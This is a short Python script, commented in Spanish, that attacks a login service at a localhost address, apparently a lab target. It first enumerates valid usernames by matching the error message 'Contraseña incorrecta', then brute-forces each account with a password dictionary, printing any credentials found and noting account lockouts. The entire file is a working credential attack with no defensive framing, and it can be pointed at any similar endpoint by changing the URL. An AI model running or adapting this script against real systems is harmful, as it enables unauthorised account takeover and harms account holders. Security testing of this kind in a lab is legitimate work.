#!/usr/bin/env python3
"""Ataque en dos fases contra el servicio de login:
1) enumeración de usuarios a partir de los mensajes de error;
2) fuerza bruta con un diccionario de contraseñas comunes."""
import json, sys, urllib.error, urllib.parse, urllib.request

URL = "http://127.0.0.1:8007/login"


def intentar(user, pw):
    data = urllib.parse.urlencode({"usuario": user, "clave": pw}).encode()
    try:
        with urllib.request.urlopen(URL, data) as r:
            return r.status, json.load(r)["mensaje"]
    except urllib.error.HTTPError as e:
        return e.code, json.load(e)["mensaje"]


candidatos = [l.strip() for l in open("usuarios.txt") if l.strip()]
claves = [l.strip() for l in open("diccionario.txt") if l.strip()]

print("Fase 1: enumeración de usuarios")
existentes = []
for u in candidatos:
    code, msg = intentar(u, "x")
    existe = msg == "Contraseña incorrecta"   # el mensaje delata que el usuario existe
    print(f"   {u:10} -> {msg}{'   <== existe' if existe else ''}")
    if existe:
        existentes.append(u)
if not existentes:
    print("   No se pudo distinguir qué usuarios existen; se prueba con todos.")
    existentes = candidatos

print(f"\nFase 2: fuerza bruta sobre {existentes} con {len(claves)} contraseñas")
for u in existentes:
    for i, pw in enumerate(claves, 1):
        code, msg = intentar(u, pw)
        if code == 200:
            print(f"   ¡Credenciales encontradas! {u} / {pw} (intento {i})")
            break
        if code == 429:
            print(f"   {u}: cuenta bloqueada en el intento {i} -> {msg}")
            break
    else:
        print(f"   {u}: no se encontró la contraseña")
